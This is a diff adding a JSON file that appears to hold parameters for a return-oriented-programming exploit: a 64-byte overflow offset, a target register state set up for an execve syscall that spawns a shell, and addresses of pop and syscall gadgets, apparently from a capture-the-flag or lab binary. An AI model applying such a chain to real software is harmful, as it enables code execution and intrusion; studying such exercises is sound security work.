@@ -1,0 +1,16 @@
+{
+  "overflow_offset": 64,
+  "target_state": {
+    "rax": 59,
+    "rdi": 4210768,
+    "rsi": 0,
+    "rdx": 0
+  },
+  "gadgets": {
+    "pop_rax_ret": "0x00000000004011a1",
+    "pop_rdi_ret": "0x00000000004011b2",
+    "pop_rsi_ret": "0x00000000004011c3",
+    "pop_rdx_ret": "0x00000000004011d4",
+    "syscall": "0x00000000004011e5"
+  }
+}
